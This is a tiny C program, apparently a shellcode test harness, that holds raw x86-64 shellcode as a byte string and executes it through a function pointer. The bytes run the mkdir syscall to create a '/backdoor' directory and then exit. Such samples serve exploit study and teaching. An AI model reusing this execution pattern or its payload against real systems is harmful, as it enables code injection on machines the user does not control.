const char code[] = "\xeb\x14\x48\x31\xc0\x5f\xbe\x09\x03\x00\x00\x04\x53\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xe7\xff\xff\xff\x2f\x62\x61\x63\x6b\x64\x6f\x6f\x72";

int main(int argc,char **argv){
	int (*func)();
	func = (int (*)()) code;
	(int)(*func)();
}
